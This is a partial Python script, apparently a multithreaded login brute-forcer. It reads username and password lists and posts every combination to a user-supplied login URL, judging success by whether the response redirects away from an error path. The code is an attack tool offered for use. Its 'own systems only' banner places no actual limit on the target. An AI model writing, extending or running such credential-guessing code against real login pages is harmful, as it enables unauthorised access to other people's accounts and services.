...
def try_login(url, username, password, error_path, session):
    payload = {"username": username, "password": password}
    try:
        response = session.post(url, data=payload, timeout=10, allow_redirects=True)
        # Success if final URL does NOT contain the error path
        if error_path not in response.url:
...
def main():
    print("=" * 45)
    print("       Local Login Bruteforcer v3.0")
    print("    For use on your own systems only.")
    print("=" * 45)

    url        = input("\n[?] Enter the URL (e.g. http://127.0.0.1:3000/login) : ").strip()
    u_file     = input("[?] Enter the username file                          : ").strip()
    p_file     = input("[?] Enter the password file                          : ").strip()
    error_path = input("[?] Enter the error redirect path (e.g. /error)      : ").strip()
    ...
    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(try_login, url, u, p, error_path, session): (u, p)
                for u in usernames
                for p in passwords
            }
